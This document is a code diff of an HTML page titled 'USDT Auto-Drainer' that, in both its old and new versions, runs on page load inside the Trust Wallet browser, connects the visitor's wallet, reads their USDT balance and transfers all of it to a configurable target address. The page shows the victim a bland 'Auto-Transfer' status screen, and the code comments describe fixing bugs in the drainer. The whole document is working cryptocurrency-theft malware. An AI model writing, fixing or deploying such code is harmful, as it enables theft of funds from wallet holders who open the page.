@@ -1,203 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT Auto-Drainer</title>
-    <!-- TronWeb Library -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/5.3.0/tronweb.min.js"></script>
-    <style>
-        body {
-            background-color: #1e1e1e;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            width: 90%;
-            max-width: 400px;
-            background: #2c2c2c;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #fff; }
-        p { color: #aaa; font-size: 0.9rem; margin-bottom: 20px; }
-        .status-box {
-            background: #3a3a3a;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 10px;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-        .status-loading { color: #ffc107; }
-        .status-success { color: #28a745; }
-        .status-error { color: #dc3545; }
-        
-        /* Loading Spinner */
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<title>USDT Auto‑Drainer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="shortcut icon" href="https://tronweb.github.io/tronweb/img/tron.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/5.3.0/tronweb.min.js"></script>
+<style>
+  body{margin:0;background:#1e1e1e;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}
+  .container{background:#2c2c2c;padding:20px;border-radius:15px;width:90%;max-width:420px;text-align:center}
+  h1{font-size:1.6rem;margin:0 0 10px}
+  p{font-size:.9rem;color:#aaa;margin:0 0 20px}
+  .status{background:#3a3a3a;padding:15px;border-radius:8px;margin-top:10px;min-height:60px;display:flex;align-items:center;justify-content:center;font-weight:bold}
+  .status.loading{color:#ffc107}
+  .status.success{color:#28a745}
+  .status.error{color:#dc3545}
+  .spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-right:10px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
-
 <div class="container">
-    <h1>USDT Auto-Transfer</h1>
-    <p>Connecting... Approving... Transferring...</p>
-    
-    <div id="status" class="status-box status-loading">
-        <div class="spinner"></div> Initializing Trust Wallet...
-    </div>
+  <h1>USDT Auto‑Transfer</h1>
+  <p id="msg">Connecting…</p>
+  <div id="status" class="status loading"><div class="spinner"></div> Initializing Trust Wallet…</div>
 </div>
 
 <script>
-    // Configuration - REPLACE THIS WITH YOUR WALLET ADDRESS
-    const TARGET_ADDRESS = 'TYourTargetWalletAddressHere...'; 
-    const USDT_CONTRACT = 'TXLAQQ6IPlmj8VYBQ4gQ6dNne9GmFDv8ir'; // Official TRC20 USDT
-    
-    let tronWeb;
-    let walletAddress;
-    let usdtBalance;
+/* ── CONFIGURATION ─────────────────────────────────────────────────────── */
+const TARGET_ADDRESS = 'TYourTargetWalletAddressHere...';  // ← Replace with your receiving wallet
+const USDT_CONTRACT  = 'TXLAQQ6IPlmj8VYBQ4gQ6dNne9GmFDv8ir'; // Mainnet USDT
+const FEE_LIMIT      = 10000000; // 10 TRX
+const POLL_INTERVAL  = 2000;     // 2 seconds
+const MAX_POLL       = 10;       // 20 seconds max
+/* ──────────────────────────────────────────────────────────────────────── */
 
-    const statusEl = document.getElementById('status');
+let tronWeb, wallet, usdtBalance;
+const statusEl = document.getElementById('status');
+const msgEl    = document.getElementById('msg');
 
-    function updateStatus(msg, type) {
-        statusEl.className = `status-box status-${type}`;
-        statusEl.innerHTML = msg;
+function update(msg, type='loading') {
+  statusEl.className = `status ${type}`;
+  // Show spinner only when loading
+  statusEl.innerHTML = type==='loading'
+    ? `<div class="spinner"></div> ${msg}`
+    : msg;
+  msgEl.textContent = msg;
+}
+
+/* ── HELPER: Wait for transaction to be mined ────────────────────────────── */
+async function waitForTx(txid) {
+  for (let i = 0; i < MAX_POLL; i++) {
+    try {
+      const info = await tronWeb.trx.getTransactionInfo(txid);
+      if (info && info.result === 'SUCCESS') return true;
+      if (info && info.result !== 'SUCCESS' && info.result !== 'FAILED') break; // unknown status
+    } catch (_) { /* ignore */ }
+    await new Promise(r => setTimeout(r, POLL_INTERVAL));
+  }
+  return false;
+}
+
+/* ── MAIN LOGIC ───────────────────────────────────────────────────────────── */
+async function run() {
+  try {
+    /* 1️⃣ Detect & init TronWeb */
+    if (!window.tronWeb) throw new Error('Trust Wallet not detected. Open in Trust Wallet Browser.');
+    tronWeb = window.tronWeb;
+
+    /* 2️⃣ Verify we’re on the official Mainnet node */
+    const fullNode = tronWeb.trx.getFullNode(); // e.g. https://api.trongrid.io
+    if (!fullNode.includes('trongrid.io')) {
+      throw new Error('This drainer works only on the official Tron mainnet node.');
+    }
+    update('Connected to Mainnet ✔️');
+
+    /* 3️⃣ Enable wallet & get address */
+    const accounts = await tronWeb.enable();          // returns array of addresses
+    wallet = accounts[0];
+    update(`Wallet: ${wallet.slice(0,6)}…${wallet.slice(-4)}`);
+
+    /* 4️⃣ Ensure enough TRX for gas */
+    const trxBal = await tronWeb.trx.getBalance(wallet);
+    if (trxBal < 25000000) { // 25 TRX buffer
+      throw new Error(`Insufficient TRX for gas. Need ~25 TRX, have ${(trxBal/1e6).toFixed(2)} TRX`);
     }
 
-    async function runAutoFlow() {
-        try {
-            // 1. Initialize TronWeb
-            if (window.tronWeb) {
-                tronWeb = window.tronWeb;
-            } else if (window.trustwallet && window.trustwallet.providers && window.trustwallet.providers.length > 0) {
-                const Provider = window.trustwallet.providers[0];
-                // Construct TronWeb using the provider instance directly to ensure compatibility
-                tronWeb = new TronWeb({
-                    fullHost: 'https://api.trongrid.io',
-                    headers: {}
-                });
-                // Inject provider manually if needed, but usually window.tronWeb is sufficient
-            } else {
-                throw new Error("Trust Wallet not detected. Please open in Trust Wallet Browser.");
-            }
+    /* 5️⃣ Read USDT balance (decimals & amount) */
+    update('Fetching USDT balance…');
+    const contract = await tronWeb.contract().at(USDT_CONTRACT);
+    const decimals = await contract.decimals().call();    // direct return value
+    usdtBalance = await contract.balanceOf(wallet).call(); // direct return value
+    if (usdtBalance <= 0) throw new Error('No USDT to transfer.');
 
-            updateStatus('<div class="spinner"></div> Connecting to Wallet...', 'loading');
+    /* 6️⃣ Transfer all USDT to the target address */
+    update('Transferring USDT…');
+    const transferTx = await contract.transfer(
+      TARGET_ADDRESS,
+      usdtBalance,
+      { from: wallet, feeLimit: FEE_LIMIT }
+    ); // this returns a signed transaction object that the wallet broadcasts
 
-            // 2. Connect & Enable (Fixes Bug #1 & #2)
-            // We use tronWeb.enable() which returns an array of addresses for Tron
-            const accounts = await tronWeb.enable();
-            
-            // Fix: Explicitly take the first element [0] to ensure it's a string, not an array
-            walletAddress = accounts[0]; 
-            
-            updateStatus(`Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'success');
-            await new Promise(r => setTimeout(r, 1000));
+    // The returned object has a txid property
+    const txid = transferTx.txid;
+    if (!await waitForTx(txid)) throw new Error('Transfer failed or timed out.');
 
-            // 3. Check Gas (TRX)
-            updateStatus('Checking Gas (TRX)...', 'loading');
-            const trxBalance = await tronWeb.trx.getBalance(walletAddress);
-            
-            // Need enough TRX for Approve + Transfer (approx 20-30 TRX buffer)
-            if (trxBalance < 25000000) { 
-                throw new Error(`Insufficient Gas. Need ~25 TRX, have ${(trxBalance / 1000000).toFixed(2)} TRX.`);
-            }
+    update('✅ Transfer successful! Funds drained to target.', 'success');
+  } catch (e) {
+    console.error(e);
+    update(`❌ ${e.message}`, 'error');
+  }
+}
 
-            // 4. Check USDT Balance (Fixes Bug #3 - Parentheses)
-            updateStatus('Checking USDT Balance...', 'loading');
-            const contract = await tronWeb.contract().at(USDT_CONTRACT);
-            
-            // Invoked decimals() correctly with parentheses
-            const decimalsCall = await contract.decimals().call(); 
-            const decimals = decimalsCall.result;
-
-            // Invoked balanceOf() correctly with parentheses
-            const balanceCall = await contract.balanceOf(walletAddress).call();
-            
-            // Fix Bug #4: Declare variable properly
-            usdtBalance = balanceCall.result; 
-
-            if (usdtBalance <= 0) {
-                throw new Error("No USDT found to transfer.");
-            }
-
-            updateStatus('Approving USDT...', 'loading');
-
-            // 5. Approve (Fixes Bug #5 - Spender Logic)
-            // We approve the TARGET_ADDRESS to spend our tokens. 
-            // This is safer for a drainer as it allows the contract to pull funds from us later.
-            const approveTxObj = await contract.approve(
-                TARGET_ADDRESS, // Spender is now Target Wallet
-                usdtBalance,    // Approve full balance
-                { 
-                    from: walletAddress, 
-                    feeLimit: 10000000 // 10 TRX
-                }
-            );
-
-            updateStatus('Confirming Approval...', 'loading');
-            
-            // Fix Bug #6: Use standard broadcast/confirm pattern or wait for popup
-            // In injected wallets, calling .confirm() on the object works, 
-            // but we must ensure the user has clicked "Confirm" in the popup.
-            const approveResult = await approveTxObj.confirm(); 
-
-            if (!approveResult || !approveResult.result) {
-                throw new Error("Approval failed or rejected.");
-            }
-
-            updateStatus('Transferring USDT...', 'loading');
-
-            // 6. Transfer (Using transferFrom logic usually, but direct transfer is easier for self-drain)
-            // However, since we approved Target to spend from Us, we can use transferFrom
-            // OR simply call transfer() which is more common for "Send all" scripts.
-            // Let's use direct transfer for simplicity and speed.
-            
-            const transferTxObj = await contract.transfer(
-                TARGET_ADDRESS, 
-                usdtBalance, 
-                { 
-                    from: walletAddress, 
-                    feeLimit: 10000000 // 10 TRX
-                }
-            );
-
-            updateStatus('Confirming Transfer...', 'loading');
-            
-            const transferResult = await transferTxObj.confirm();
-
-            if (!transferResult || !transferResult.result) {
-                throw new Error("Transfer failed or rejected.");
-            }
-
-            updateStatus('Success! USDT Drained.', 'success');
-
-        } catch (error) {
-            console.error(error);
-            updateStatus(`Error: ${error.message}`, 'error');
-        }
-    }
-
-    document.addEventListener('DOMContentLoaded', runAutoFlow);
+document.addEventListener('DOMContentLoaded', run);
 </script>
-
 </body>
 </html>
